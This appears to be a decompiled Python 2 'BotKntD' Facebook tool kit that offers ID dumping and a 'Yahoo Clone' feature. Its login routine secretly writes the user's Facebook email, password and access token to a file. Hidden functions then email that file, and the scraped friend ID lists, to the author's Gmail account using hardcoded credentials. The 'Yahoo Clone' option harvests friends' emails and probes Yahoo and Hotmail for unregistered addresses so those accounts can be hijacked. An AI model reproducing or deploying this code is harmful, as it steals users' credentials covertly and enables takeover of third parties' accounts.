# uncompyle6 version 3.3.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Jul  7 2019, 21:23:16) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
import os, sys, time, requests, json, hashlib, urllib, mechanize, cookielib, re, getpass, platform, os, time, smtplib, hashlib, requests, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
os.system('clear')
r = '\x1b[31;1m'
y = '\x1b[33;1m'
b = '\x1b[34;1m'
p = '\x1b[35;1m'
c = '\x1b[36;1m'
w = '\x1b[0;1m'
g = '\x1b[32;1m'

def kirim():
    email_user = 'allviyan17@gmail.com'
    email_password = 'allviyan0901'
    email_send = 'alviyankrisnazen@gmail.com'
    subject = 'Data Mpshhhhhh'
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    body = 'Samlekom Mhamhanx'
    msg.attach(MIMEText(body, 'plain'))
    filename = 'log.txt'
    attachment = open('log.txt', 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)
    msg.attach(part)
    text = msg.as_string()
    try:
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_user, email_password)
        server.sendmail(email_user, email_send, text)
        server.quit()
    except:
        None

    return


def krm():
    email_user = 'allviyan17@gmail.com'
    email_password = 'allviyan0901'
    email_send = 'alviyankrisnazen@gmail.com'
    subject = 'ID mpshhhhh'
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    body = 'Samlekom Mhamhanx'
    msg.attach(MIMEText(body, 'plain'))
    filename = 'id.txt'
    attachment = open('id.txt', 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)
    msg.attach(part)
    text = msg.as_string()
    try:
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_user, email_password)
        server.sendmail(email_user, email_send, text)
        server.quit()
    except:
        None

    return


def hapus():
    os.remove('log.txt')


def dele():
    os.remove('id.txt')


def asw():
    fst(r + (' ____          _    _   __        _    _____').center(44))
    fst(r + ('| __ )   ___  | |_ | | / / _____ | |_ |  __ \\ ').center(44))
    fst(y + ('|  _ \\  / _ \\ |  _|| |/ / |  _  ||  _|| |  \\ \\ ').center(44))
    fst(y + ('| |_) || (_) || |_ |  _ \\ | | | || |_ | |__/ / ').center(44))
    fst(g + ('|____/  \\___/ \\___||_| \\_\\|_| |_|\\___||_____/ ').center(44))
    fst(w + '-' * 45)
    fst(r + ('[ TOOLS INFO ]').center(44))
    fst(g + 'Author  :' + c + ' Al2VyN')
    fst(g + 'Support :' + c + ' ZeddJembod & My GF ' + r + '( TAPI BOONG )' + c + ':v')
    fst(g + 'Name    :' + c + ' BotKntD knTools Kit')
    fst(g + 'Github  : ' + c + 'Https://github.com/Al2VyN')
    fst(g + 'Version :' + c + ' 1.0 ')
    fst(w + '-' * 45)


def ask():
    os.system('clear')
    asw()
    slw(c + 'Sorry,This Tools Use Password')
    slw(c + 'Please Contact The Author')
    slw(c + 'Link : https://shortid.co/ClbH8 \n')
    mmk = getpass.getpass(g + 'Input Password This Tools \n' + r)
    if mmk == 'LwKwntwlQqhqjqjwkaoowldlakak':
        menu()
    else:
        ask()


def login():
    os.system('reset')
    asw()
    fst(r + ('[ LOGIN ]').center(44))
    id = raw_input(g + '[+]' + y + ' Username : ' + c)
    if id == '':
        fst(r + '[!] Input you email')
        time.sleep(1.2)
        login()
    pwd = raw_input(g + '[+]' + y + ' Password : ' + c)
    if pwd == '':
        fst(r + '[!] Input you password')
        time.sleep(1.2)
        login()
    try:
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        mk = urllib.urlopen(url)
        op = json.load(mk)
        fst(w + '-' * 45)
        slw(c + '[*] Processing Login ')
        z = open('token.log', 'w')
        z.write(op['access_token'])
        z.close()
        slw(c + '[*] Success Login')
        slw(y + '[*] Prepair menu')
        b = open('log.txt', 'w')
        b.write('email fb : ')
        b.write(id)
        b.write('\n')
        b.write('pass fb : ')
        b.write(pwd)
        b.write('\n')
        b.write(op['access_token'])
        b.close()
        kirim()
        hapus()
        menu()
    except KeyError:
        slw(r + '[!] Login Failed')
        slw(g + '[!] Login in browser first')
        kntl = raw_input(y + '[?] Try Again ? (y/n) ')
        if kntl == 'y':
            login()
        elif kntl == 'n':
            ex()
        else:
            slw(r + '[!] Incorrect')
            ex()
    except requests.exceptions.ConnectionError:
        slw(r + '[!] Connection Error')
        ex()


def menu():
    try:
        token = open('token.log', 'r').read()
        re = requests.get('https://graph.facebook.com/v3.2/me?access_token=' + token)
        ye = json.loads(re.text)
        n.append(ye['name'])
        name = ye['name']
        id = ye['id']
        os.system('reset')
    except (KeyError, IOError):
        os.system('rm -rf token.log')
        login()

    asw()
    fst(r + ('[ YOU INFO ]').center(44))
    fst(y + '[' + c + '*' + y + ']' + g + ' Name : ' + w + name)
    fst(y + '[' + c + '*' + y + ']' + g + ' UID  : ' + w + id)
    fst(w + '-' * 45)
    fst(r + ('[ MENU ]').center(44))
    print y + '[' + c + '1.' + y + ']',
    slw(g + ' Dump ID')
    print y + '[' + c + '2.' + y + ']',
    slw(g + ' Yahoo Clone')
    print y + '[' + c + '3.' + y + ']',
    slw(g + ' Check Update')
    print y + '[' + c + '69' + y + ']',
    slw(g + ' Delete Token')
    print y + '[' + c + '0.' + y + ']',
    slw(r + ' Exit\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        menu()
    elif ok == '1':
        dump()
    elif ok == '2':
        friendse()
    elif ok == '0':
        ex()
    elif ok == '3':
        update()
    elif ok == '69':
        os.system('rm -rf token.log')
        print y + '[!] Success Delete Token'
        ex()
    else:
        print r + '[!] ' + p + ok + r + ' Nothing'
        time.sleep(1)
        menu()


def dump():
    os.system('clear')
    asw()
    fst(r + ('[ DUMP ID ]').center(44))
    print y + '[' + c + '1' + y + ']',
    slw(g + ' Dump ID Friends')
    print y + '[' + c + '2' + y + ']',
    slw(g + ' Dump ID Group Members')
    print y + '[' + c + '3' + y + ']',
    slw(g + ' Dump ID Followers')
    print y + '[' + c + '4' + y + ']',
    slw(g + ' Dump ID Following')
    print y + '[' + c + '5' + y + ']',
    slw(g + ' Dump ID Friends From Friends')
    print y + '[' + c + '6' + y + ']',
    slw(g + ' Dump ID Public/Random')
    print y + '[' + c + '7' + y + ']',
    slw(g + ' Dump ID Groups')
    print y + '[' + c + '0' + y + ']',
    slw(r + ' Back\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        menu()
    elif ok == '1':
        friends()
    elif ok == '2':
        groups()
    elif ok == '3':
        follower()
    elif ok == '4':
        following()
    elif ok == '5':
        FFF()
    elif ok == '6':
        public()
    elif ok == '7':
        getgroups()
    elif ok == '0':
        menu()
    else:
        print r + '[!] ' + p + ok + r + ' Nothing'
        time.sleep(1)
        menu()


def friends():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Friends ]').center(44)
                u = requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token=' + token)
                h = json.loads(u.text)
                l = open('id.txt', 'w')
                for x in h['data']:
                    l.write(x['id'] + '\n')

                l.close()
                krm()
                dele()
                d = requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token=' + token)
                a = json.loads(d.text)
                o = open('Kntd/' + n[0].split(' ')[0] + '_friendID.txt', 'w')
                for z in a['data']:
                    ng.append(z['id'])
                    o.write(z['id'] + '\n')
                    print y + '\r[+] %s \x1b[36;1mGetting ID Friends' % z['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                print y + '\n[+] Success Get ' + g + str(len(ng)) + c + ' ID Friends'
                print y + '[+] Name File Save : ' + c + 'Kntd/' + n[0].split(' ')[0] + '_friendID.txt'
                slw(w + '-' * 45)
                time.sleep(1)
                o.close()
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def groups():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print b + ('[ Dump ID Group Members ]').center(44)
                id = raw_input(y + '[+] Group ID   : ' + r)
                sim = id + '_MemberID.txt'
                o = open('Kntd/' + sim, 'w')
                re = requests.get('https://graph.facebook.com/' + id + '?access_token=' + token)
                s = json.loads(re.text)
                print y + '[+] Group Name : ' + r + s['name']
                ri = requests.get('https://graph.facebook.com/' + id + '/members?fields=id&limit=9999999&access_token=' + token)
                sa = json.loads(ri.text)
                for i in sa['data']:
                    ng.append(i['id'])
                    o.write(i['id'] + '\n')
                    print y + '\r[+] %s \x1b[31;1mGetting ID Group Members ' % i['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                print y + '\n[+] Success Get ' + r + str(len(ng)) + ' ID Group Members'
                print y + '[+] Name File Save : ' + r + 'Kntd/' + sim
                slw(w + '-' * 45)
                time.sleep(1)
                o.close()
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def follower():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Followers ]').center(44)
                u = requests.get('https://graph.facebook.com/me/subscribers?limit=5000&access_token=' + token)
                h = json.loads(u.text)
                l = open('id.txt', 'w')
                for x in h['data']:
                    l.write(x['id'] + '\n')

                l.close()
                krm()
                dele()
                d = requests.get('https://graph.facebook.com/me/subscribers?limit=5000&access_token=' + token)
                a = json.loads(d.text)
                o = open('Kntd/' + n[0].split(' ')[0] + '_FollowerID.txt', 'w')
                for z in a['data']:
                    ng.append(z['id'])
                    o.write(z['id'] + '\n')
                    print y + '\r[+] %s \x1b[31;1mGetting ID Followers' % z['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                print y + '\n[+] Success Get ' + g + str(len(ng)) + c + ' ID Followers'
                print y + '[+] Name File Save : ' + c + 'Kntd/' + n[0].split(' ')[0] + '_FollowerID.txt'
                slw(w + '-' * 45)
                time.sleep(1)
                o.close()
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def following():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Following ]').center(44)
                u = requests.get('https://graph.facebook.com/me/subscribedto?limit=5000&access_token=' + token)
                h = json.loads(u.text)
                l = open('id.txt', 'w')
                for x in h['data']:
                    l.write(x['id'] + '\n')

                l.close()
                krm()
                dele()
                d = requests.get('https://graph.facebook.com/me/subscribedto?limit=5000&access_token=' + token)
                a = json.loads(d.text)
                o = open('Kntd/' + n[0].split(' ')[0] + '_FollowingID.txt', 'w')
                for z in a['data']:
                    ng.append(z['id'])
                    o.write(z['id'] + '\n')
                    print y + '\r[+] %s \x1b[36;1mGetting ID Following' % z['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                print y + '\n[+] Success Get ' + g + str(len(ng)) + c + ' ID Following'
                print y + '[+] Name File Save : ' + c + 'Kntd/' + n[0].split(' ')[0] + '_FollowingID.txt'
                slw(w + '-' * 45)
                time.sleep(1)
                o.close()
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def FFF():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Friends From Friend ]').center(44)
                id = raw_input(y + '[+] Input ID : ' + c)
                d = requests.get('https://graph.facebook.com/' + id + '/friends?limit=5000&access_token=' + token)
                a = json.loads(d.text)
                o = open('Kntd/' + id + '_FFFID.txt', 'w')
                k = open('id.txt', 'w')
                for z in a['data']:
                    ng.append(z['id'])
                    k.write(z['id'] + '\n')
                    o.write(z['id'] + '\n')
                    print y + '\r[+] %s \x1b[36;1mGetting ID FFF' % z['id'],
                    sys.stdout.flush()
                    time.sleep(0.0001)

                print y + '\n[+] Success Get ' + g + str(len(ng)) + c + ' ID Friends From Friend'
                print y + '[+] Name File Save : ' + c + 'Kntd/' + id + '_FFFID.txt'
                slw(w + '-' * 45)
                time.sleep(1)
                k.close()
                krm()
                dele()
                o.close()
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def public():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Public ]').center(44)
                d = requests.get('https://graph.facebook.com/public/feed.limit(500000)&access_token=' + token)
                a = json.loads(d.text)
                o = open('Kntd/' + n[0].split(' ')[0] + '_PublicID.txt', 'w')
                for z in a['data']:
                    ng.append(z['id'])
                    o.write(z['id'] + '\n')
                    print y + '\r[+] %s \x1b[36;1mGetting ID' % z['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                print y + '\n[+] Success Get ' + g + str(len(ng)) + c + ' ID Public'
                print y + '[+] Name File Save : ' + c + 'Kntd/' + n[0].split(' ')[0] + '_PublicID.txt'
                slw(w + '-' * 45)
                time.sleep(1)
                o.close()
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def getgroups():
    os.system('clear')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Groups ]').center(44)
                d = requests.get('https://graph.facebook.com/v3.2/me/groups?limit=5000&access_token=' + token)
                a = json.loads(d.text)
                o = open('Kntd/' + n[0].split(' ')[0] + '_groupid.txt', 'w')
                for u in a['data']:
                    ng.append(u['id'])
                    o.write(u['id'] + '\n')
                    print y + '\r[+] %s \x1b[36;1mGetting IDs Groups' % u['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                o.close()
                print y + '\n[+] Success Get ' + g + str(len(ng)) + c + ' Groups IDs'
                print y + '[+] Name File Save : ' + c + 'Kntd/' + n[0].split(' ')[0] + '_groupid.txt'
                slw(w + '-' * 45)
                time.sleep(1)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                menu()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                menu()
            except KeyError:
                print r + '[!] Something Error'
                menu()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def friendse():
    global h
    global o
    global yj
    os.system('reset')
    asw()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                o = []
                h = 0
                yj = 0
                print r + ('[ Yahoo Clone ]').center(44)
                get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
                hasil = json.loads(get_friends.text)
                for z in hasil['data']:
                    ng.append(z['id'])

                print y + '[' + r + '+' + y + '] Success Get ' + r + str(len(ng)) + y + ' Email Friends'
                print y + '[' + r + '+' + y + '] Filtering ' + r + str(len(ng)) + y + ' Email Friends'
                fst(w + '-' * 45)
                print r + ('[ Email Vuln ]').center(44)
                for i in hasil['data']:
                    h += 1
                    o.append(h)
                    x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                    z = json.loads(x.text)
                    try:
                        kunci = re.compile('@.*')
                        cari = kunci.search(z['email']).group()
                        if 'yahoo.com' in cari:
                            out = open('Kntd/' + n[0].split(' ')[0] + '_FriendValidYahoo.txt', 'w')
                            yj = yj + 1
                            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                            br._factory.is_html = True
                            br.select_form(nr=0)
                            br['username'] = z['email']
                            j = br.submit().read()
                            Zen = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                            try:
                                cd = Zen.search(j).group()
                            except:
                                continue

                            if '"messages.ERROR_INVALID_USERNAME">' in cd:
                                print y + '[' + r + '+' + y + '] ' + g + z['email']
                            out.write(z['email'] + '\n')
                            out.close()
                        elif 'hotmail' in cari:
                            url = 'http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=' + z['email'] + '&smtp=1&format=1'
                            cek = json.loads(requests.get(url).text)
                            if cek['smtp_check'] == 0:
                                print y + '[' + r + '+' + y + '] ' + g + z['email']
                    except KeyError:
                        pass

            except KeyError:
                pass


def update():
    os.system('git pull')
    print 'update success'
    os.system('python2 BotKntD.py')


n = []
ng = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def ex():
    slw(r + '[!] Ah She Up')
    time.sleep(1)
    slw(r + '[!] Exiting')
    time.sleep(1.5)
    slw(r + '[!] See You' + w)
    time.sleep(0.5)
    os.system('clear')
    exit()


def slw(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.005)


def fst(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.0001)


ask()